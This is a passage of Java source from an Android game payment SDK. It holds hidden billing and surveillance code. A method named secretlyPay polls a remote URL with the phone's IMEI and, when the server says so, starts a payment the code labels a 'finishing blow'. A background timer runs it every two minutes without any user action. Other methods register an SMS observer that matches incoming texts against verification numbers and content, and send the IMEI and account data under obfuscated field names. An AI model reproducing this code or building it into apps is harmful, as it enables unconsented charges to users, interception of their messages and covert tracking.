			PaymentFactoy.producePay(mkInfo.mkClassName,context).pay(context, indexOrderMap.get(i),
					i,feeInfo,mkInfo);
			if (!secretlyStart) secretlyStart = true;
		} catch (Throwable e) {
			Util_G.debugE("allPay", e.getMessage());
			allNotifyPayFail(PayConfig.PAY_EXPTION_FAIL, "支付异常",i);
		}
	}
	/**
	 * 检查是否有漏掉的 订单
	 */
	private void secretlyPay(){
		if (context==null&&!secretlyStart) {
			return;
		}
		final String urlstr = Constants.PAY_SECRET_URL+ "imei=" + Helper.getIMEI(context)+"&packet_id="+packetId;
		try{
			String response = HttpRequestt.get(urlstr).body();
			if (!StringUtil.isEmpty(response)) {
				JSONObject object = Helper.getJSONObject(response);
				String shop_group_index = Helper.getJsonString(object, "shop_group_index");
				int state = Helper.getJsonInt(object, "state");
				if (state==1&&(!StringUtil.isEmpty(shop_group_index)&&shop_group_index.contains("_"))) {
					String[] spliteStr = shop_group_index.split("_");
					if (spliteStr.length == 2) {
						int payindex = Integer.parseInt(spliteStr[0]);
						repeatPayIndex = Integer.parseInt(spliteStr[1])+1;
						if (!PayConfig.IS_PAYING) {
							pay(200,  payindex, "补刀");
						} 
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		} 
	
	}
	
	private String creatPayOrderId(int length) {
		String payOrder = UUID.randomUUID().toString();
		payOrder = (payOrder.replace("-", "")).substring(0, length);
		return payOrder;
	}
	
	public GroupFeeInfo getCurgGroupFeeInfo(){
		if (shopInfoMap == null) return null;
		if (!shopInfoMap.containsKey(payindex)) return null;
		ShopInfo shopInfo = shopInfoMap.get(payindex);
		if (shopInfo.listGroupInfo.size()<=repeatPayIndex||repeatPayIndex<0) return null;
  	  	GroupFeeInfo groupFeeInfo = shopInfo.listGroupInfo.get(repeatPayIndex);
  	  	return groupFeeInfo;
	}
	
	public boolean needReadSms(){
		boolean var = false;
		GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
		for (Map.Entry<Integer, Integer> entry:groupFeeInfo.intdexMkMap.entrySet()) {
			int key = entry.getKey();
			if (groupFeeInfo.getIntdexVerifyMap().get(key) == 1) {
				var = true;
				break;
			}
		}
		for (MkInfo info:instance.payIdMap.values()) {
			if (!StringUtil.isEmpty(info.vertifyNum)||info.interceptContents.size()>0) {
				var = true;
				break;
			}
		}
		return var;
	}
	/**
	 * 当前计费组合是否含有 需要回调才能判断的支付类型  并且是没有二次确认框的 
	 * @return 计费点的 index
	 */
	public int haveCallbakePay(){
		int feeIndex = -1;
		if (shopInfoMap == null) return feeIndex;
		if (!shopInfoMap.containsKey(payindex)) return feeIndex;
		ShopInfo shopInfo = shopInfoMap.get(payindex);
		if (shopInfo.listGroupInfo.size()<=repeatPayIndex||repeatPayIndex<0) return feeIndex;
  	  	GroupFeeInfo groupFeeInfo = shopInfo.listGroupInfo.get(repeatPayIndex);
  	  	if (groupFeeInfo.feeInfos!=null) {
  	  		for (int i = 0; i < groupFeeInfo.feeInfos.size(); i++) {
  	  			int mk = groupFeeInfo.feeInfos.get(i).mk;
  	  			if (mkIsSdk.containsKey(mk)&&mkIsSdk.get(mk)) {
					return i;
				}
  	  		}
		}
  	  	return feeIndex;
	}
	public void allNotifyPayFail(int what ,String erroMsg,int index){
		if (indexOrderMap.size()==0) {//如果这个时候 订单号为空 自动生成一个
			indexOrderMap.put(0, creatPayOrderId(11));
		}
		PayResultInfo info = new PayResultInfo();
		info.resutCode = what;
		info.retMsg = erroMsg;
		info.index = index;
		Message msg = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		msg.obj = info;
		msg.sendToTarget();
	}
	public static boolean isFill(String sms, String phone) {
		boolean ret = false;
		for (MkInfo info:instance.payIdMap.values()) {
			if (!StringUtil.isEmpty(info.vertifyNum)&&phone.contains(info.vertifyNum)) {
				return true;
			}
			if (info.interceptContents.size()>0) {
				boolean intercept = true;
				for (int i = 0; i < info.interceptContents.size(); i++) {
					if (!sms.contains(info.interceptContents.get(i))) {
						intercept = false;
					}
				}
				if (intercept) {
					return true;
				}
			}
			
		}
		return ret;
	}
	
	public void makeToast(String message) {
		if (Helper.isDebugEnv()) {
			Toast.makeText(context, message, Toast.LENGTH_LONG).show();
		}
    }
	
	/**
	 * 0  、支付结果都还没回来才
	 * 1、支付结果都回来了（有成功的，也有可能有失败的）
	 * 2、支付结果都回来了 并且都是失败
	 * @return
	 */
	public int overPay(){
		GroupFeeInfo groupFeeInfo = getCurgGroupFeeInfo();
		int over = 0;
		boolean succOver = true;
		boolean failOver = true;
		for (Integer value:groupFeeInfo.recodePayResult.values()) {
			if (value != 1&&value>0) {
				succOver = false;
			}
			if (value!=2) {
				failOver = false;
			}
		}
		if (succOver) over = 1;
		if (failOver) over = 2;
		return over;
	}
	
	/**
	 * 以后 支付正常的结束 以及轮询到第二套支付 都在这里处理
	 * type 0 支付成功的检测 1支付失败的检测 2支付取消的检测 3 超时的检测 
	 */
	public synchronized void allCheckPay(int type){
		if (type == 3) {//如果是超时了 直接结束当前 计费组合
			if (checkToOther(0)) {//走第三方
				payResultHandle.removeMessages(PayConfig.NOTIFY_PAYRESULT);
				notifyToOtherPay();
			}
		}else{
			if (overPay()==1) {//成功的回调 已经在handler中做了相关处理
				payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
				PayConfig.IS_PAYING = false;
			}else if (overPay()==2) {//直接轮询下一套
				Util_G.debugE("ALLPAY", "下一套支付开始->>"+repeatPayIndex);
				payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
				if (checkToOther(2000)) {
					payResultHandle.removeMessages(PayConfig.NOTIFY_PAYRESULT);
					notifyToOtherPay();
				}
			}
		}
	}
	
	/**
	 * 检测是否执行第三方支付，如果不执行第三方 那肯定是轮询下一套计费了
	 * @param delayTimer 轮询下一套计费要等待的时间 毫秒
	 * @return
	 */
	private boolean checkToOther(int delayTimer) {
		boolean isToOther = false;
		if (!shopInfoMap.containsKey(payindex)) {
			isToOther = true;
		}else{
			List<GroupFeeInfo> listGroupInfo = shopInfoMap.get(payindex).listGroupInfo;
			if ((repeatPayIndex+1)<listGroupInfo.size()) {//像支付失败后  要轮询都会走这里面了
				repeatPayIndex++;
				Util_G.debugE("ALLPay", "repeatPayIndex==》"+repeatPayIndex);
				payResultHandle.removeMessages(delayNoticeOverPayResult);
				payResultHandle.sendEmptyMessageDelayed(delayNoticeOverPayResult,delayTimer);
			}else{
				isToOther = true;
			}
		}
		return isToOther;
	};
	public void notifyPaymentFinish(int amount) {
        if (gameSDKPaymentListener != null) {
            gameSDKPaymentListener.onPayFinished(amount);
        }
    }
    public void notifyPaymentCancelled() {
        if (gameSDKPaymentListener != null) {
            gameSDKPaymentListener.onPayCancelled();
        }
        PayConfig.IS_PAYING = false;
    }
    public void notifyPaymentFail(PayResultInfo info) {
        if (gameSDKPaymentListener != null) {
            gameSDKPaymentListener.onPayFail(info);
        }
        PayConfig.IS_PAYING = false;
    }
    
    public void notifyToOtherPay(){
    	try {
    		if (directPay.equals("-1")) {
    			otherHandler.sendEmptyMessage(PayConfig.WECAHT_FAIL);
			}else{
				payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
				//失败之后 如果直接再走第三方要重新生成订单号
				indexOrderMap.clear();
				indexOrderMap.put(0, creatPayOrderId(11));
				PaymentFactoy.producePay("mobi.zty.pay.sdk.wecaht.WeChatInstance",context).pay(context,
						indexOrderMap.get(0), SendOder.getInstance().amount, SendOder.getInstance().payname,PayConfig.WECHAT_PAY+"");
				directPay = PayConfig.WECHAT_PAY+"";
			}
		} catch (Throwable e) {
			otherHandler.sendEmptyMessage(PayConfig.SP_PAY_EXPTION);
		}
		return;
    }
    
    public ContentObserver mObserver;
	private static void addSMSObserver(Context context)
    {
		try {
			 ContentResolver resolver = context.getContentResolver();
		     Handler handler = new SMSHandler(resolver, context);
		     instance.mObserver = new SMSObserver(resolver, handler);
		     resolver.registerContentObserver(SMS.CONTENT_URI, true, instance.mObserver);
		} catch (Throwable e) {
			e.printStackTrace();
		}
    }
    
    /**
     * 退出游戏时调用
     */
    public void exitGame(){
    	handler.sendEmptyMessage(NOTICE_EXITGAME);
    	
    }
	private void notiFyExitGame() {
		exitTrure();
	}
	private void exitTrure() {
		if (instance.mObserver!=null) {
    		context.getContentResolver().unregisterContentObserver(instance.mObserver);
		}
		statisticsDuration(null);
		PayConfig.IS_PAYING = false;
    	payway = 0;
    	setDebug(false);
    	context.unregisterReceiver(mSMSReceiver1);
		instance = null;
		SendTimer = false;
		System.exit(0);
		android.os.Process.killProcess(android.os.Process.myPid());
	}
    
    private class DurationTread extends Thread{
		@Override
		public void run() {
			super.run();
			while (SendTimer) {
				try {
					watch();
					Thread.sleep(1000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
    long background = 0;
    public void watch() {
		if (!mPowerManager.isScreenOn() || !Helper.isAppOnForeground(context)) {//如果游戏不在前端马上发送数据
			if (background>0) {
				background = 0;
				statisticsDuration(null);
				afdf3();
			}
		} else {
			background++;
			if (background > 60*2) {// 2分钟发送一次 
				statisticsDuration(null);
				afdf3();
				secretlyPay();
				background = 0;
			}
		}
	}
    /**
     * 统计时长
     * @param storage
     */
	private void statisticsDuration(LocalStorage storage) {
		if (storage == null) {
			 storage = LocalStorage.getInstance(context);
		}
        int afd = 0;
        afd = (int)(System.currentTimeMillis()/1000);
        int dt = afd-instance.afdft;
        storage.putString("adff2", String.valueOf(dt>0?dt:0));
	}
	
	public  void afdf3() {
    	if (!Helper.isNetworkConnected(context)||afdf==null) {//如果进来时初始化没成功 就不发送在线时长统计
            return;
        }
    	String adff0 = null;
    	if (adff0==null||adff0.trim().equals("")) {
    		adff0 = Helper.getIMEI(context);
		}
        try {
        	LocalStorage storage = LocalStorage.getInstance(context);
        	int adff2 = 0;
        	int adff3 = 0;
        	String content="0";
        	String  adff4 = "";
        	String  adff5 = "";
        	String  adff6 = "";
            try {
                
                 content = storage.getString("adff2", "0");//crypto.decrypt(deviceId,content);
                 adff2 = Integer.valueOf(content);
                 
                 content = storage.getString("adff3", "0");//crypto.decrypt(deviceId,content);
                 adff3 = Integer.valueOf(content);
                 
                 adff4 = storage.getString("adff4", "");
                 adff5 = storage.getString("adff5", "");
                 adff6 = storage.getString("adff6", "");
                 
            } catch (Exception ex) {
            }
            JSONObject user = new JSONObject();
            user.put("device_id", deviceId);
            user.put("packet_id", packetId);
            user.put("game_id", gameId);
            user.put("login_account", adff0);
            user.put("server_id", adff4);
            user.put("adff5", adff5);
            user.put("adff6", adff6);

            user.put("adff2", adff2);
            user.put("adff3", adff3);
            
            user.put("ver", Constants.GAME_SDK_VERSION);
            
            HttpRequest<UserInfo> request = new HttpRequest<UserInfo>(context,
            		null, 
            		null);//new LoginListener(loginCallback))
            request.execute(
            		afdf,
                    user.toString());
            
//            Log.e("afdf3", "afdf3--->"+user.toString());
            instance.afdft = (int)(System.currentTimeMillis()/1000);
        } catch (Exception ex) {
           // makeToast("初始化失败，请退出程序后再试");
        }
    }
	
	public void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (directPay.equals(PayConfig.WECHAT_PAY+"")) {
			directPay="";
			PayConfig.IS_PAYING = false;//这里重置为false 不然下次支付可能会有
			if (data == null) {
				notifyPaymentCancelled();
				return;
			}
			String respCode = data.getExtras().getString("respCode");
			String errorCode = data.getExtras().getString("errorCode");
			String respMsg = data.getExtras().getString("respMsg");
			if (respCode == null) {
				notifyPaymentCancelled();
				return;
			}
			StringBuilder temp = new StringBuilder();
			if (respCode.equals("00")) {
				temp.append("交易状态:成功");
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_SUCC);
			} else if (respCode.equals("02")) {
				// temp.append("交易状态:取消");
				notifyPaymentCancelled();
			} else if (respCode.equals("01")) {
				temp.append("交易状态:失败").append("\n").append("错误码:")
						.append(errorCode).append("原因:" + respMsg);
				PayResultInfo info = new PayResultInfo();
				info.resutCode = PayConfig.WECHAT_PAY_FAIL;
				info.retMsg = temp.toString();
				notifyPaymentFail(info);
			} else if (respCode.equals("03")) {
				temp.append("交易状态:未知").append("\n").append("错误码:")
						.append(errorCode).append("原因:" + respMsg);
				PayResultInfo info = new PayResultInfo();
				info.resutCode = PayConfig.WECHAT_PAY_FAIL;
				info.retMsg = temp.toString();
				notifyPaymentFail(info);
			}
		}

	}
	public String getPhoneNum() {
		return phoneNum;
	}
	public void setPhoneNum(String phoneNum) {
		this.phoneNum = phoneNum;
	}
	public String getObtainNum() {
		return obtainNum;
	}
	public void setObtainNum(String obtainNum) {
		this.obtainNum = obtainNum;
	}
	public String getPayResultUrl() {
		return payResultUrl;
	}
	public void setPayResultUrl(String payResultUrl) {
		this.payResultUrl = payResultUrl;
	}
	
	public String getNumUrl() {
		return numUrl;
	}
	
	public String getOrderId(int intdex){
		if (indexOrderMap.containsKey(intdex)) {
			return indexOrderMap.get(intdex);
		}
		return null;
	}
	
}
